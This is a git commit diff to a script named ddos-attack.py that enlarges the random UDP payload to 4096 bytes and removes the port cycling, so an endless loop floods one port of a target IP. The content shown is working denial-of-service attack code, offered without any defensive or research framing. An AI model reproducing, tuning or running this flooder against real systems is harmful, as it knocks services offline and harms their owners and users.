fabb22a94facf80d9b79500b5f47ad05bb12888a
HEISEN黑森 <102943051+yunsen2025@users.noreply.github.com>
2025-02-16 01:36:20 +0800

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -15,7 +15,7 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(4096)
 #############
 
 os.system("clear")
@@ -43,7 +43,4 @@ sent = 0
 while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
-    port = port + 1
     print("Sent %s packet to %s through port:%s" % (sent, ip, port))
-    if port == 65534:
-        port = 1
